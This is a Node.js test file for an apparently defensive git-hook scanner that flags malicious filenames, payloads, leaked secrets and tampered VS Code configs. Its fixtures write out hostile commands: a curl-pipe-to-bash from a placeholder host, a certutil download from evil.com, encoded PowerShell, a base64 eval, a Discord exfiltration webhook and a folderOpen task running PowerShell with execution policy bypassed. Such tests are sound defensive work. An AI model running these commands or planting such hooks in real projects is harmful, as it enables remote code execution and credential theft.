const { describe, it } = require('node:test');
const assert = require('node:assert');
const { checkFilename } = require('../src/rules/filenames');
const { scanPayloads } = require('../src/rules/payloads');
const { scanSecrets } = require('../src/rules/secrets');
const { inspectIdeConfig } = require('../src/rules/ideConfig');
const { scanFilesAndDiff } = require('../src/scanner');
const { installHook, uninstallHook } = require('../src/installer');

describe('Filename & Extension Checks', () => {
  it('should block known injection filenames', () => {
    const maliciousNames = [
      'temp_auto_push.bat',
      'temp_interactive_push.bat',
      'config.bat',
      'autorun.bat',
      'hidden_push.sh'
    ];

    for (const name of maliciousNames) {
      const result = checkFilename(name);
      assert.ok(result, `Expected ${name} to be detected`);
      assert.strictEqual(result.severity, 'CRITICAL');
    }
  });

  it('should flag dangerous executable extensions', () => {
    const dangerous = ['malware.exe', 'trojan.scr', 'script.vbs', 'hook.ps1'];
    for (const name of dangerous) {
      const result = checkFilename(name);
      assert.ok(result, `Expected ${name} to be flagged`);
    }
  });

  it('should detect disguised double extensions', () => {
    const result = checkFilename('invoice.pdf.exe');
    assert.ok(result);
    assert.strictEqual(result.severity, 'CRITICAL');
  });

  it('should allow legitimate project files', () => {
    const cleanFiles = ['src/index.js', 'package.json', 'README.md', 'components/Button.tsx', 'styles.css'];
    for (const file of cleanFiles) {
      const result = checkFilename(file);
      assert.strictEqual(result, null);
    }
  });
});

describe('Payload Signatures Detection', () => {
  it('should detect PowerShell encoded command payloads', () => {
    const diff = `+ powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...`;
    const threats = scanPayloads(diff);
    assert.strictEqual(threats.length, 1);
    assert.strictEqual(threats[0].name, 'PowerShell Obfuscated/Encoded Execution');
    assert.strictEqual(threats[0].severity, 'CRITICAL');
  });

  it('should detect remote shell piping (curl | bash)', () => {
    const diff = `+ curl -fsSL https://malicious.site/payload.sh | bash`;
    const threats = scanPayloads(diff);
    assert.ok(threats.length >= 1);
    assert.strictEqual(threats[0].name, 'Remote Pipe to Shell');
  });

  it('should detect base64 dynamic eval execution', () => {
    const diff = `+ eval(base64_decode("c3lzdGVtKCdtYWx3YXJlJyk7"));`;
    const threats = scanPayloads(diff);
    assert.ok(threats.length >= 1);
    assert.strictEqual(threats[0].name, 'Obfuscated Base64 Eval');
  });

  it('should detect Windows lolbins abuse (certutil / bitsadmin)', () => {
    const diff = `+ certutil.exe -urlcache -split -f http://evil.com/malware.exe malware.exe`;
    const threats = scanPayloads(diff);
    assert.ok(threats.length >= 1);
    assert.strictEqual(threats[0].name, 'Certutil Remote Cache Download');
  });

  it('should detect Discord webhook credential exfiltration', () => {
    const diff = `+ const hook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";`;
    const threats = scanPayloads(diff);
    assert.ok(threats.length >= 1);
    assert.strictEqual(threats[0].name, 'Discord Webhook Exfiltration Candidate');
  });
});

describe('Secret & Credential Checks', () => {
  it('should detect committed .env file', () => {
    const threats = scanSecrets('', '.env');
    assert.ok(threats.some(t => t.name.includes('.env')));
  });

  it('should detect leaked private keys', () => {
    const diff = `+ -----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...`;
    const threats = scanSecrets(diff);
    assert.ok(threats.some(t => t.name === 'Private Key'));
  });

  it('should detect GitHub Personal Access Tokens', () => {
    const diff = `+ const GITHUB_TOKEN = "ghp_123456789012345678901234567890123456";`;
    const threats = scanSecrets(diff);
    assert.ok(threats.some(t => t.name === 'GitHub Personal Access Token'));
  });
});

describe('IDE Configuration Tampering', () => {
  it('should detect malicious tasks with runOn folderOpen', () => {
    const tasksContent = JSON.stringify({
      version: '2.0.0',
      tasks: [
        {
          label: 'Setup',
          type: 'shell',
          command: 'powershell.exe -ExecutionPolicy Bypass -File .cache/update.ps1',
          runOptions: { runOn: 'folderOpen' }
        }
      ]
    });
    const threats = inspectIdeConfig('.vscode/tasks.json', tasksContent);
    assert.ok(threats.some(t => t.name.includes('Folder Open')));
  });

  it('should detect terminal profile hijacking in settings.json', () => {
    const settingsContent = JSON.stringify({
      'terminal.integrated.profiles.windows': {
        'PowerShell': {
          'path': 'C:\\temp\\fake_powershell.exe'
        }
      }
    });
    const threats = inspectIdeConfig('.vscode/settings.json', settingsContent);
    assert.ok(threats.length > 0);
  });
});

describe('Hook Installer and Uninstaller', () => {
  it('should install and uninstall hook cleanly in current git repo', () => {
    const installResult = installHook();
    assert.strictEqual(installResult.success, true);

    const uninstallResult = uninstallHook();
    assert.strictEqual(uninstallResult.success, true);
  });
});
